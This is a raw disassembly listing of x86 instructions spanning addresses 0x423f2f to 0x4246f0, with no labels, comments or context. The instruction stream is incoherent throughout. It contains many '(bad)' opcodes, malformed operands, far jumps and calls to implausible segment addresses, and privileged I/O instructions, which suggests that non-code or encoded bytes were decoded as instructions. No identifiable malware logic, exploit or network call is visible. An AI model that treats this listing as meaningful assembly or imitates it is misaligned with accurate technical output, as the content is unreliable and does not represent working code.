  423f2f:	jnp    0x423f5a
  423f31:	pushf  
  423f32:	pop    es
  423f33:	jae    0x423f1a
  423f35:	cs icebp 
  423f37:	push   esp
  423f38:	aaa    
  423f39:	push   edx
  423f3a:	mov    bl,0x1e
  423f3c:	lods   eax,DWORD PTR ds:[esi]
  423f3d:	xchg   esp,eax
  423f3e:	sar    ecx,1
  423f40:	and    al,0xe1
  423f42:	mov    ?,WORD PTR [eax-0x58]
  423f45:	mul    cl
  423f47:	pop    edx
  423f48:	add    esi,ecx
  423f4a:	xchg   DWORD PTR [ebp-0x56],ebp
  423f4d:	hlt    
  423f4e:	stos   BYTE PTR es:[edi],al
  423f4f:	pop    ds
  423f50:	not    ah
  423f52:	and    al,0x3a
  423f54:	pop    es
  423f55:	pop    esi
  423f56:	fcomp  QWORD PTR [ebp-0x1b]
  423f59:	or     cl,BYTE PTR [edx-0x48]
  423f5c:	xlat   BYTE PTR ds:[ebx]
  423f5d:	fistp  WORD PTR [eax+0x60287f8f]
  423f63:	les    ebp,FWORD PTR [ecx-0x21]
  423f66:	ja     0x423ee8
  423f68:	pop    ss
  423f69:	addr16 inc esp
  423f6b:	test   DWORD PTR [ebx-0x9d24a96],ecx
  423f71:	daa    
  423f72:	loop   0x423fde
  423f74:	cwde   
  423f75:	imul   ecx,DWORD PTR [edi+0x53],0x9a69a3f2
  423f7c:	test   al,0x88
  423f7e:	inc    edx
  423f7f:	std    
  423f80:	nop
  423f81:	(bad)  
  423f82:	jmp    0x5364:0xbb7ec77f
  423f89:	pop    es
  423f8a:	mov    ecx,0xedf86310
  423f8f:	je     0x423fb9
  423f91:	fcom   QWORD PTR [eax]
  423f93:	adc    DWORD PTR ds:0x7aa8097d,esp
  423f99:	mov    ecx,0x429c2547
  423f9e:	cmova  edi,DWORD PTR [edx+0x7]
  423fa2:	shl    DWORD PTR [eax+0x450f7469],1
  423fa8:	push   ds
  423fa9:	call   0x8d36:0x59eb225b
  423fb0:	adc    DWORD PTR [edi+0x578f62b6],ebx
  423fb6:	cmc    
  423fb7:	js     0x423f60
  423fb9:	clc    
  423fba:	xor    eax,0x7e5648c7
  423fbf:	adc    ch,BYTE PTR [ecx]
  423fc1:	jl     0x423f56
  423fc3:	xor    bh,BYTE PTR [ebx+0x14]
  423fc6:	xchg   ecx,eax
  423fc7:	dec    eax
  423fc8:	sub    dh,bh
  423fca:	or     ecx,DWORD PTR [ecx]
  423fcc:	add    eax,edx
  423fce:	popa   
  423fcf:	cmp    ebx,DWORD PTR [edx+0x63f04cd2]
  423fd5:	ret    
  423fd6:	pop    edi
  423fd7:	jge    0x423fb9
  423fd9:	fwait
  423fda:	jns    0x423f7e
  423fdc:	test   eax,edi
  423fde:	repz ror BYTE PTR [edi+0x20c89c3a],0xbf
  423fe6:	add    esp,DWORD PTR [ebx+0x43]
  423fe9:	dec    ecx
  423fea:	push   ecx
  423feb:	push   cs
  423fec:	xchg   ebp,eax
  423fed:	jnp    0x423f86
  423fef:	dec    edx
  423ff0:	sti    
  423ff1:	inc    esp
  423ff2:	push   edx
  423ff3:	push   ecx
  423ff4:	jp     0x42405e
  423ff6:	int3   
  423ff7:	pop    edx
  423ff8:	imul   eax,DWORD PTR [ebp-0x75],0x56
  423ffc:	repz retf 
  423ffe:	loopne 0x423fb7
  424000:	dec    edx
  424001:	jb     0x424074
  424003:	pop    esp
  424004:	pop    esi
  424005:	(bad)  
  424006:	xchg   BYTE PTR [edx-0x3e],cl
  424009:	in     al,0xf5
  42400b:	scas   eax,DWORD PTR es:[edi]
  42400c:	or     esi,esp
  42400e:	cdq    
  42400f:	jae    0x423fe7
  424011:	and    eax,0x935afcdf
  424016:	inc    ebx
  424017:	pop    esi
  424018:	mov    dh,0x9
  42401a:	jne    0x42407f
  42401c:	std    
  42401d:	jb     0x423fc3
  42401f:	cmp    bh,BYTE PTR [esi]
  424021:	jecxz  0x423ffd
  424023:	pop    es
  424024:	rcr    al,cl
  424026:	add    DWORD PTR [edx-0x38],esp
  424029:	mov    WORD PTR [ebp-0x4ceb3487],fs
  42402f:	xlat   BYTE PTR ds:[ebx]
  424030:	(bad)  
  424031:	repz lea edx,[esi]
  424034:	lods   eax,DWORD PTR ds:[esi]
  424035:	pop    ecx
  424036:	fisubr DWORD PTR [ecx+0x38]
  424039:	cld    
  42403a:	les    edi,FWORD PTR [eax]
  42403c:	pop    ss
  42403d:	mov    al,ds:0x15ba6177
  424042:	loopne 0x424037
  424044:	dec    esp
  424045:	aam    0xae
  424047:	int    0x7d
  424049:	pop    edx
  42404a:	xchg   ebx,eax
  42404b:	push   edx
  42404c:	add    eax,0x65d0270a
  424051:	sbb    BYTE PTR [edx+0x3774e66c],al
  424057:	(bad)  
  424058:	cmp    BYTE PTR [ebp-0x43],dl
  42405b:	pop    eax
  42405c:	adc    eax,0xfcb724cf
  424061:	or     DWORD PTR [esi-0x7aefb61],edx
  424067:	sbb    DWORD PTR [esi+esi*2+0x38b8e8bf],edx
  42406e:	pop    esp
  42406f:	inc    esi
  424070:	mov    ds:0x82b365ee,al
  424075:	add    DWORD PTR [ecx],ecx
  424077:	mov    bh,al
  424079:	test   BYTE PTR [eax],cl
  42407b:	pushf  
  42407c:	cwde   
  42407d:	pop    edx
  42407e:	mov    ecx,esi
  424080:	lods   eax,DWORD PTR ds:[esi]
  424081:	ds xchg esi,eax
  424083:	ds int3 
  424085:	fnsave [edi+0x5c]
  424088:	pshufw mm6,QWORD PTR [edx+edi*2+0x51f953f8],0x31
  424091:	fwait
  424092:	xchg   dh,dh
  424094:	lock jmp 0x85d72f09
  42409a:	jmp    ebx
  42409c:	xchg   esp,eax
  42409d:	addr16 (bad) 
  42409f:	jae    0x4240fa
  4240a1:	add    edi,DWORD PTR [edx-0x6d]
  4240a4:	shr    BYTE PTR [ecx-0x2529aed9],1
  4240aa:	push   cs
  4240ab:	retf   0xf7bb
  4240ae:	jge    0x4240c3
  4240b0:	aad    0x31
  4240b2:	cmp    esi,DWORD PTR [edi]
  4240b4:	jne    0x424109
  4240b6:	mov    ecx,0x67135446
  4240bb:	dec    edi
  4240bc:	adc    eax,0x1e47c3fe
  4240c1:	inc    esp
  4240c2:	enter  0xf0ce,0x61
  4240c6:	or     ebp,esi
  4240c8:	add    DWORD PTR [eax-0x685159f3],eax
  4240ce:	mov    BYTE PTR [edi],ch
  4240d0:	pop    esi
  4240d1:	imul   DWORD PTR [ecx-0x2a]
  4240d4:	jle    0x42413d
  4240d6:	je     0x42410e
  4240d8:	sub    eax,0xbb8c200b
  4240dd:	les    esi,FWORD PTR [edi]
  4240df:	push   ss
  4240e0:	inc    esp
  4240e1:	ret    0xd772
  4240e4:	ret    
  4240e5:	outs   dx,BYTE PTR ds:[esi]
  4240e6:	mov    bl,0x85
  4240e8:	adc    eax,esi
  4240ea:	push   cs
  4240eb:	ds leave 
  4240ed:	(bad)  
  4240ee:	lock cmp eax,0x1743f3ba
  4240f4:	aam    0xda
  4240f6:	xor    al,BYTE PTR [edi]
  4240f8:	stos   DWORD PTR es:[edi],eax
  4240f9:	add    ebx,edx
  4240fb:	mov    DWORD PTR [ebp+0x55488674],ebp
  424101:	sbb    DWORD PTR [eax-0x5bf692e4],edx
  424107:	cli    
  424108:	(bad)  
  424109:	iret   
  42410a:	adc    ecx,DWORD PTR [eax+0x49159bb3]
  424110:	sbb    DWORD PTR [ecx+0x38],ebp
  424113:	rol    BYTE PTR [edi+ecx*4-0x80],1
  424117:	stc    
  424118:	sar    BYTE PTR [edi-0x69],cl
  42411b:	cmp    al,0xf8
  42411d:	cwde   
  42411e:	xor    esp,DWORD PTR [ecx]
  424120:	mov    al,0x5c
  424122:	int3   
  424123:	jno    0x424184
  424125:	adc    eax,0x50ede45c
  42412a:	arpl   WORD PTR [bp+di],cx
  42412d:	retf   0xa016
  424130:	push   ds
  424131:	test   al,0x32
  424133:	mov    esi,0x5d421a44
  424138:	pop    ebp
  424139:	pop    ebp
  42413a:	dec    edi
  42413b:	inc    eax
  42413c:	and    al,0x6e
  42413e:	inc    edi
  42413f:	fidivr DWORD PTR [eax*8+0x5d19300a]
  424146:	int    0x6a
  424148:	rol    DWORD PTR [edi-0x53],cl
  42414b:	and    eax,0x50d62d5d
  424150:	adc    bl,BYTE PTR [edx-0xda80cd2]
  424156:	inc    esp
  424158:	push   ebx
  424159:	sti    
  42415a:	leave  
  42415b:	scas   eax,DWORD PTR es:[edi]
  42415c:	out    0x79,eax
  42415e:	out    dx,al
  42415f:	in     al,0xd
  424161:	outs   dx,DWORD PTR ds:[esi]
  424162:	int3   
  424163:	mov    DWORD PTR [ebp+0x60],0xaf6252cf
  42416a:	sbb    edi,DWORD PTR [edx+eax*8]
  42416d:	add    ecx,ecx
  42416f:	mov    bh,0x61
  424171:	jle    0x4241e9
  424173:	jbe    0x42411a
  424175:	mov    DWORD PTR [edi],edi
  424177:	test   BYTE PTR [ecx+0x30],bl
  42417a:	xor    edx,DWORD PTR [ebp-0x6fe1b975]
  424180:	(bad)  
  424181:	jl     0x4241fe
  424183:	sbb    eax,0x66961097
  424188:	ret    
  424189:	push   esp
  42418a:	xor    DWORD PTR [ebp+0x350777d0],ebx
  424190:	jae    0x4241f9
  424192:	outs   dx,DWORD PTR ds:[esi]
  424193:	pop    esi
  424194:	and    al,0x59
  424196:	add    edi,DWORD PTR [eax+0x5bcef2a5]
  42419c:	pop    ebp
  42419d:	push   ebp
  42419e:	retf   0xae9d
  4241a1:	aaa    
  4241a2:	out    dx,eax
  4241a3:	adc    bh,BYTE PTR [eax+0x6db2573d]
  4241a9:	(bad)  
  4241aa:	test   al,0xc8
  4241ac:	add    al,0xe8
  4241ae:	mov    WORD PTR [eax],fs
  4241b0:	pop    ebp
  4241b1:	stc    
  4241b2:	retf   
  4241b3:	aas    
  4241b4:	lods   al,BYTE PTR fs:[esi]
  4241b6:	xchg   ecx,eax
  4241b7:	jg     0x42414b
  4241b9:	jne    0x4241df
  4241bb:	jmp    0x8c97:0x7445973f
  4241c2:	data16 outs dx,BYTE PTR ds:[esi]
  4241c4:	mov    ebx,0x776fb9df
  4241c9:	adc    eax,0x70e4b75b
  4241ce:	cwde   
  4241cf:	ds shl bh,0xa
  4241d3:	mov    ?,esp
  4241d5:	pop    esi
  4241d6:	scas   al,BYTE PTR es:[edi]
  4241d7:	jbe    0x4241d3
  4241d9:	cmp    DWORD PTR [ecx+0x11559ceb],esi
  4241df:	mov    edx,0x6dee38ee
  4241e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4241e5:	repnz fs loope 0x424192
  4241e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241ea:	pop    esp
  4241eb:	jg     0x42419a
  4241ed:	(bad)  
  4241ee:	aaa    
  4241ef:	into   
  4241f0:	ret    0x17d8
  4241f3:	pop    esi
  4241f4:	(bad)  
  4241f5:	adc    BYTE PTR [ecx],0x23
  4241f8:	(bad)  
  4241f9:	aam    0xb6
  4241fb:	sub    cl,BYTE PTR [ebx]
  4241fd:	stc    
  4241fe:	inc    edx
  4241ff:	(bad)  
  424200:	adc    BYTE PTR [ebp+0x57],bl
  424203:	mov    eax,ds:0x46e522fc
  424208:	pop    edi
  424209:	lods   al,BYTE PTR ds:[esi]
  42420a:	or     DWORD PTR [ebp-0x59526bbd],0xe9f9e7d9
  424214:	and    dh,BYTE PTR [ebp+0xb]
  424217:	jo     0x42420d
  424219:	push   edx
  42421a:	push   esi
  42421b:	mov    ebx,0xecfe3dbf
  424220:	mov    cx,0x1f34
  424224:	or     al,0xb9
  424226:	js     0x424249
  424228:	adc    BYTE PTR [ecx-0xd0825],ch
  42422e:	push   ebp
  42422f:	pop    esp
  424230:	leave  
  424231:	xor    eax,0x5802bcdf
  424236:	int    0x44
  424238:	xchg   edx,eax
  424239:	mov    eax,0x89cac623
  42423e:	cmp    al,0xc7
  424240:	push   0x47e9a6e9
  424245:	push   0x61e7aa3d
  42424a:	arpl   WORD PTR [ecx+0x2f],di
  42424d:	test   BYTE PTR [ebx],bh
  42424f:	xor    al,0x23
  424251:	jp     0x4242bc
  424253:	(bad)
  424256:	sbb    DWORD PTR [edx+edx*2],esi
  424259:	xor    eax,0xc2c9198
  42425e:	rcr    BYTE PTR [edx],0x33
  424261:	xchg   edx,eax
  424262:	test   al,al
  424264:	bound  eax,QWORD PTR [ebp+0x16]
  424267:	ss ret 0x6a25
  42426b:	aad    0x85
  42426d:	jecxz  0x42422b
  42426f:	test   bh,ch
  424271:	iret   
  424272:	add    DWORD PTR [edx],edi
  424274:	cld    
  424275:	lahf   
  424276:	push   esi
  424277:	pop    ss
  424278:	or     cl,BYTE PTR [esi-0x6b9e2b4]
  42427e:	xchg   DWORD PTR [edx-0x4ddb6cd1],edi
  424284:	mov    eax,ds:0xeca2df01
  424289:	stc    
  42428a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42428b:	fld    QWORD PTR [ebx+0x1b]
  42428e:	fdivr  QWORD PTR [ebx+0x1c]
  424291:	outs   dx,BYTE PTR ds:[esi]
  424292:	push   0x67e50114
  424297:	pop    esi
  424298:	mov    dh,0x72
  42429a:	push   ebx
  42429b:	outs   dx,DWORD PTR ds:[esi]
  42429c:	dec    esi
  42429d:	adc    ecx,DWORD PTR [eax-0x3c]
  4242a0:	push   eax
  4242a1:	add    eax,0x2d07b12d
  4242a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242a7:	(bad)  
  4242a8:	mov    esi,0xc2de425e
  4242ad:	pop    esi
  4242ae:	ret    
  4242af:	mov    dh,0xbf
  4242b1:	repz aas 
  4242b3:	jne    0x42429b
  4242b5:	aaa    
  4242b6:	inc    esp
  4242b7:	and    al,0xfd
  4242b9:	sar    BYTE PTR ss:[ebx+0x7d],cl
  4242bd:	dec    ebp
  4242be:	shl    DWORD PTR [ebx-0x55d968c5],0xba
  4242c5:	mov    esp,0x4ac797db
  4242ca:	add    esi,edi
  4242cc:	and    BYTE PTR [esi-0x47f5a5ce],cl
  4242d2:	sub    edi,DWORD PTR [edi-0x33]
  4242d5:	adc    eax,0xc934757f
  4242da:	add    bl,BYTE PTR gs:[ecx+0x2f]
  4242de:	fst    DWORD PTR [esi]
  4242e1:	ror    DWORD PTR [edi-0x2a33112d],1
  4242e7:	dec    ecx
  4242e8:	push   edi
  4242e9:	mov    edx,0x89d209b5
  4242ee:	mov    ds:0xd5d8f1d5,al
  4242f3:	into   
  4242f4:	sbb    DWORD PTR [ecx+0x4cd6b2e1],edi
  4242fa:	pop    ds
  4242fb:	add    DWORD PTR [esi-0x78],eax
  4242fe:	dec    eax
  4242ff:	repz dec ebx
  424301:	cld    
  424302:	sub    al,0xe3
  424304:	jl     0x4242f0
  424306:	push   0x30
  424308:	jecxz  0x424388
  42430a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42430b:	xchg   edx,eax
  42430c:	stc    
  42430d:	loope  0x424373
  42430f:	mov    ebx,0x59345e26
  424314:	rcr    edi,0x36
  424317:	mov    ah,0x82
  424319:	sub    ecx,DWORD PTR [ebx]
  42431b:	pop    ss
  42431c:	bound  ecx,QWORD PTR [edx+0x3ca8a7ac]
  424322:	js     0x4242d1
  424324:	data16 jbe 0x4242c9
  424327:	out    dx,eax
  424328:	aaa    
  424329:	shl    BYTE PTR [edx],0x56
  42432c:	sub    al,0x86
  42432e:	mov    ebx,0x42cf64b0
  424333:	jg     0x4242e0
  424335:	sub    dh,BYTE PTR [ebp+0x77]
  424338:	aaa    
  424339:	or     al,dl
  42433b:	or     eax,DWORD PTR [ebp+0x69]
  42433e:	add    DWORD PTR [ebx+0x6f],edx
  424341:	mov    ebx,0x56ff9218
  424346:	repnz cld 
  424348:	xchg   ebp,eax
  424349:	mov    al,0x13
  42434b:	ffreep st(5)
  42434d:	mov    cl,0xc9
  42434f:	popa   
  424350:	aaa    
  424351:	stc    
  424352:	psubq  mm0,QWORD PTR [ecx]
  424355:	(bad)  
  424356:	sbb    al,0xb6
  424358:	(bad)  
  424359:	and    al,0x48
  42435b:	cwde   
  42435c:	push   ecx
  42435d:	das    
  42435e:	ins    DWORD PTR es:[edi],dx
  42435f:	push   edi
  424360:	(bad)  
  424361:	mov    ah,0x4a
  424363:	repnz mov eax,ds:0x6d919835
  424369:	mov    eax,0x8c1a0035
  42436e:	mov    ch,0x44
  424370:	int    0x73
  424372:	xor    dh,BYTE PTR [ebx]
  424374:	mov    ah,BYTE PTR [ebx]
  424376:	addr16 mov al,ds:0x787b
  42437a:	mov    edi,0xba56991c
  42437f:	loopne 0x424347
  424381:	fs or  dl,bh
  424384:	add    eax,0x61079a0f
  424389:	mov    ebp,DWORD PTR [esi]
  42438b:	jae    0x4243a3
  42438d:	dec    edx
  42438e:	in     al,0xd4
  424390:	cld    
  424391:	sub    ch,BYTE PTR [ebp-0x51f3bf34]
  424397:	iret   
  424398:	out    dx,eax
  424399:	rcr    eax,0x3d
  42439c:	mov    ah,0x8f
  42439e:	in     eax,0x4a
  4243a0:	xchg   BYTE PTR [edx-0x30],dl
  4243a3:	mov    DWORD PTR [edi],esp
  4243a5:	lods   al,BYTE PTR ds:[esi]
  4243a6:	jne    0x424409
  4243a8:	es sahf 
  4243aa:	push   edx
  4243ab:	rcr    ch,0x66
  4243ae:	daa    
  4243af:	mov    eax,0x1b855c17
  4243b4:	jle    0x42438d
  4243b6:	mov    ah,0x5b
  4243b8:	mov    dh,al
  4243ba:	test   al,0x91
  4243bc:	sub    ch,al
  4243be:	inc    eax
  4243bf:	xor    al,BYTE PTR [edi-0x3a]
  4243c2:	or     BYTE PTR [esi-0x3fe013ce],ch
  4243c8:	outs   dx,DWORD PTR ds:[esi]
  4243c9:	lea    esp,[ebx+0x7a]
  4243cc:	call   0xa9af8c24
  4243d1:	das    
  4243d2:	popa   
  4243d3:	shr    BYTE PTR [edi+0x5d],cl
  4243d6:	jmp    0xd5bdb4ff
  4243db:	xor    al,0x70
  4243dd:	in     al,0x26
  4243df:	sbb    al,0xad
  4243e1:	push   cs
  4243e2:	lahf   
  4243e3:	enter  0x5741,0xeb
  4243e7:	mov    ds:0x788630f3,al
  4243ec:	push   edx
  4243ed:	xchg   edx,eax
  4243ee:	loopne 0x424380
  4243f0:	das    
  4243f1:	stos   BYTE PTR es:[edi],al
  4243f2:	add    ebx,edi
  4243f4:	jp     0x424465
  4243f6:	in     al,0xa
  4243f8:	fistp  QWORD PTR [ebx]
  4243fa:	and    al,0x9f
  4243fc:	loope  0x4243c1
  4243fe:	sbb    eax,0x296d1308
  424403:	mov    ecx,0xc0c63af3
  424408:	(bad)  
  424409:	shr    dl,1
  42440b:	nop
  42440c:	call   0xfff4:0xb0001e38
  424413:	cmp    eax,0xf2ccaed6
  424418:	sbb    edi,ebp
  42441a:	lahf   
  42441b:	loop   0x4243e9
  42441d:	fiadd  WORD PTR [eax]
  42441f:	add    BYTE PTR [eax],al
  424421:	add    BYTE PTR [edx+ebx*8],ch
  424424:	iret   
  424425:	cmp    bh,0x95
  424428:	outs   dx,DWORD PTR ds:[esi]
  424429:	(bad)  
  42442a:	jecxz  0x4243f5
  42442c:	push   ds
  42442d:	ins    DWORD PTR es:[edi],dx
  42442e:	into   
  42442f:	and    BYTE PTR [edx+0x1bd45ce],ch
  424435:	add    ah,dh
  424437:	add    al,0x0
  424439:	add    BYTE PTR [ebx-0x32],al
  42443c:	bound  esp,QWORD PTR [esi]
  42443e:	or     al,0x11
  424440:	dec    eax
  424441:	xlat   BYTE PTR ds:[ebx]
  424442:	dec    ebx
  424443:	push   0x54
  424445:	popf   
  424446:	rcl    BYTE PTR [edx+0x70],0x73
  42444a:	mov    edi,0xab69ac80
  42444f:	shl    DWORD PTR [ebx+0x249311a9],cl
  424455:	xchg   ebx,eax
  424456:	clc    
  424457:	int    0x64
  424459:	jg     0x424454
  42445b:	sub    DWORD PTR [ebx],edi
  42445d:	push   0x7f6caa10
  424462:	mov    al,0xf6
  424464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424465:	jmp    0x1f12:0xae95e48b
  42446c:	clc    
  42446d:	enter  0x121c,0x9d
  424471:	or     eax,0x130ddb21
  424476:	jge    0x4244bf
  424478:	jae    0x424406
  42447a:	push   edi
  42447b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42447c:	push   edi
  42447d:	repnz retf 
  42447f:	push   eax
  424480:	int    0x9e
  424482:	jle    0x42442c
  424484:	push   edx
  424485:	ret    
  424486:	aam    0xb
  424488:	push   edi
  424489:	or     BYTE PTR [ebp-0x64],ch
  42448c:	push   esi
  42448d:	pop    esp
  42448e:	dec    edi
  42448f:	fild   DWORD PTR [esi+ecx*2-0x2bee38ef]
  424496:	jo     0x4244aa
  424498:	popf   
  424499:	add    DWORD PTR [ebx+ecx*1+0x63],ecx
  42449d:	cmp    DWORD PTR [esi],ebx
  42449f:	jecxz  0x42449d
  4244a1:	pmaxub mm0,QWORD PTR [edx+0x4e]
  4244a5:	mov    al,ds:0x60787cb5
  4244aa:	les    esi,FWORD PTR [edx]
  4244ac:	xor    BYTE PTR [eax+0x6ed572b2],al
  4244b2:	jmp    0x821bd272
  4244b7:	lds    edx,FWORD PTR [edi]
  4244b9:	(bad)  
  4244ba:	out    0xc3,eax
  4244bc:	jne    0x424505
  4244be:	xchg   esp,eax
  4244bf:	rol    DWORD PTR [esi],1
  4244c1:	jne    0x424511
  4244c3:	sbb    al,0x13
  4244c5:	(bad)  
  4244c6:	mov    bl,0xb0
  4244c8:	add    BYTE PTR [edx],cl
  4244ca:	pop    edx
  4244cb:	xor    eax,0x7e0a7b9e
  4244d0:	mov    es,WORD PTR [edi]
  4244d2:	jae    0x424502
  4244d4:	or     ebx,edi
  4244d6:	js     0x4244b7
  4244d8:	enter  0xb0ff,0x7b
  4244dc:	dec    ebp
  4244dd:	add    ebp,DWORD PTR [ecx-0x6b]
  4244e0:	add    ch,BYTE PTR [ecx]
  4244e2:	and    BYTE PTR [ebx+0x35ee4b89],dl
  4244e8:	xchg   ecx,eax
  4244e9:	jge    0x424561
  4244eb:	int3   
  4244ec:	or     ebx,DWORD PTR [eax]
  4244ee:	fs inc esi
  4244f0:	dec    ebp
  4244f1:	jmp    0x6b03:0xbf644299
  4244f8:	jbe    0x424558
  4244fa:	(bad)  
  4244fb:	rol    BYTE PTR [edi-0x1c375a99],cl
  424501:	xchg   edi,eax
  424502:	sbb    eax,0x5a9b5cfc
  424507:	cdq    
  424508:	cmp    esi,DWORD PTR [edi]
  42450a:	xlat   BYTE PTR ds:[ebx]
  42450b:	push   ebx
  42450c:	inc    edi
  42450d:	int3   
  42450e:	dec    ecx
  42450f:	cmp    eax,0x180bd5dc
  424514:	push   ss
  424515:	aam    0xe4
  424517:	pop    eax
  424518:	and    al,0xc4
  42451a:	out    dx,al
  42451b:	bound  esp,QWORD PTR [bx]
  42451e:	repz adc al,0xbd
  424521:	xchg   ecx,eax
  424522:	sub    BYTE PTR [edi],bh
  424524:	dec    ecx
  424525:	js     0x424548
  424527:	xchg   BYTE PTR ds:0xefa45f3f,bh
  42452d:	lock shl al,1
  424530:	jbe    0x42457b
  424532:	(bad)  
  424534:	mov    ah,0x5a
  424536:	mov    esi,eax
  424538:	lahf   
  424539:	mov    ss,WORD PTR [eax-0x9]
  42453c:	sbb    esp,DWORD PTR [ebp+0x60]
  42453f:	cs aas 
  424541:	int    0x73
  424543:	inc    esi
  424544:	stos   BYTE PTR es:[edi],al
  424545:	pop    esp
  424546:	add    bh,ah
  424548:	xor    DWORD PTR [edi+ecx*2+0x328d6dea],esi
  42454f:	jo     0x4244eb
  424551:	mov    ebx,0xdd1bb6b7
  424556:	into   
  424557:	fdiv   st,st(2)
  424559:	xchg   ebp,eax
  42455a:	jle    0x424575
  42455c:	mov    esi,0x65f7a63c
  424561:	jb     0x4245c4
  424563:	inc    ebp
  424564:	jae    0x424564
  424566:	or     bh,BYTE PTR [ebx+0x67f9619f]
  42456c:	mov    bh,BYTE PTR [ebp+0x49]
  42456f:	mov    ch,0x34
  424571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424572:	pop    eax
  424573:	pusha  
  424574:	dec    eax
  424575:	fsub   DWORD PTR [edx]
  424577:	jae    0x424536
  424579:	pop    ebp
  42457a:	stos   BYTE PTR es:[edi],al
  42457b:	fst    DWORD PTR [ebp-0x36]
  42457e:	popa   
  42457f:	mov    WORD PTR [edi-0x43776732],es
  424585:	push   es
  424586:	pusha  
  424587:	mov    esp,0x3f58334f
  42458c:	scas   eax,DWORD PTR es:[edi]
  42458d:	inc    esi
  42458e:	push   esi
  42458f:	aam    0x4b
  424591:	fild   WORD PTR [ebx+eax*1+0x32940ca6]
  424598:	or     eax,0x60d894e0
  42459d:	and    al,BYTE PTR [esi]
  42459f:	and    esi,eax
  4245a1:	or     ebp,edx
  4245a3:	mov    al,0x77
  4245a5:	pop    es
  4245a6:	aam    0xa6
  4245a8:	push   esi
  4245a9:	add    DWORD PTR [ebx-0x5434c0ab],edi
  4245af:	mov    bh,0xd3
  4245b1:	xchg   dl,cl
  4245b3:	(bad)  
  4245b5:	push   0x709d444e
  4245ba:	push   edx
  4245bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245bc:	(bad)  
  4245bd:	loopne 0x4245b6
  4245bf:	mov    dl,0x98
  4245c1:	or     al,0xa
  4245c3:	das    
  4245c4:	loope  0x424593
  4245c6:	sbb    edi,DWORD PTR [edx]
  4245c8:	leave  
  4245c9:	dec    esp
  4245ca:	cmp    eax,0x464c1e9e
  4245cf:	cs push cs
  4245d1:	fiadd  WORD PTR [ecx+0x311fd610]
  4245d7:	adc    al,0x5e
  4245d9:	iret   
  4245da:	in     eax,dx
  4245db:	out    dx,al
  4245dc:	mov    ds:0xb45025f9,al
  4245e1:	int    0x50
  4245e3:	xchg   edi,eax
  4245e4:	pop    ebp
  4245e5:	and    dl,BYTE PTR [esi+0x51]
  4245e8:	sbb    ecx,ebx
  4245ea:	jmp    0xfaa29d09
  4245ef:	test   DWORD PTR [esi+0xf],ebx
  4245f2:	adc    eax,esi
  4245f4:	in     al,0x84
  4245f6:	xchg   ecx,eax
  4245f7:	fwait
  4245f8:	push   eax
  4245f9:	jl     0x4245f0
  4245fb:	lds    esi,FWORD PTR [edx+0x6b]
  4245fe:	adc    eax,0xf6543307
  424603:	mov    dh,0xa9
  424605:	adc    al,0x8a
  424607:	mov    esi,0xdccb7b18
  42460c:	cdq    
  42460d:	mov    ds:0xc093d953,eax
  424612:	inc    esi
  424613:	test   eax,0xdb0e842
  424618:	psrld  mm5,QWORD PTR [ebp-0x7e]
  42461c:	lods   al,BYTE PTR ds:[esi]
  42461d:	cmp    edx,DWORD PTR [esi+ecx*4-0x18]
  424621:	pushf  
  424622:	and    DWORD PTR [eax+ecx*2],ecx
  424625:	cmp    BYTE PTR [edi+ebx*2+0x58],ch
  424629:	into   
  42462a:	ins    DWORD PTR es:[edi],dx
  42462b:	imul   ebx,DWORD PTR [eax-0x453ae4e4],0xb4630681
  424635:	mov    eax,0xcd4b5a71
  42463a:	inc    BYTE PTR [edi-0x5c]
  42463d:	pop    ebx
  42463e:	xchg   ebp,eax
  42463f:	jno    0x42469d
  424641:	jmp    0x81784791
  424646:	loopne 0x4245ca
  424648:	int3   
  424649:	mov    bh,0x6b
  42464b:	loop   0x4245cf
  42464d:	jo     0x424603
  42464f:	push   esp
  424650:	sbb    al,0x7d
  424652:	pop    ebp
  424653:	(bad)  [esi+ebp*1-0x41a85eb]
  42465a:	mov    al,ds:0x688a55e1
  42465f:	jp     0x424638
  424661:	leave  
  424662:	dec    ebp
  424663:	lock lock pop ss
  424666:	jae    0x424699
  424668:	or     DWORD PTR [eax-0xf],esp
  42466b:	mov    ecx,0xc47dcb4a
  424670:	inc    ecx
  424671:	loop   0x42466c
  424673:	lods   al,BYTE PTR ds:[esi]
  424674:	jmp    DWORD PTR [edx+ecx*4+0x6d]
  424678:	sar    cl,cl
  42467a:	jl     0x424664
  42467c:	arpl   WORD PTR [esi+ecx*8],si
  42467f:	repnz and BYTE PTR ss:[edi+eax*2+0x282a7a5c],bh
  424688:	addr16 aad 0x22
  42468b:	and    eax,0x93cfc9ac
  424690:	in     eax,dx
  424691:	xchg   edi,eax
  424692:	cs gs nop
  424695:	adc    ax,0x33ff
  424699:	adc    BYTE PTR [edx+0x7c],ch
  42469c:	adc    al,0xfc
  42469e:	cmp    eax,0x5efe2d73
  4246a3:	(bad)  
  4246a4:	pop    esp
  4246a5:	sbb    esi,DWORD PTR [edi-0x7a]
  4246a8:	pop    ds
  4246a9:	div    edi
  4246ab:	add    eax,0xc2908703
  4246b0:	lahf   
  4246b1:	push   0x34c017b5
  4246b6:	inc    ebx
  4246b7:	pusha  
  4246b8:	inc    eax
  4246b9:	(bad)  
  4246ba:	xor    eax,0x3290646
  4246bf:	push   cs
  4246c0:	push   cs
  4246c1:	fdivrp st(7),st
  4246c3:	dec    esi
  4246c4:	out    0x41,eax
  4246c6:	ins    DWORD PTR es:[edi],dx
  4246c7:	(bad)  
  4246c8:	mov    eax,0xfcbe6b1
  4246cd:	test   ah,cl
  4246cf:	ins    BYTE PTR es:[edi],dx
  4246d0:	jae    0x42466d
  4246d2:	xchg   edi,eax
  4246d3:	imul   ebx,DWORD PTR [ebx-0x55],0xffffffc6
  4246d7:	jge    0x42474f
  4246d9:	cmc    
  4246da:	pop    esp
  4246db:	sbb    DWORD PTR [ebp+0x5b],ecx
  4246de:	mov    al,ds:0x4b944d68
  4246e3:	mov    DWORD PTR [edi-0x41],0xc83bbdad
  4246ea:	test   BYTE PTR [edi-0x6f],bl
  4246ed:	ss loop 0x4246f7
  4246f0:	clc    
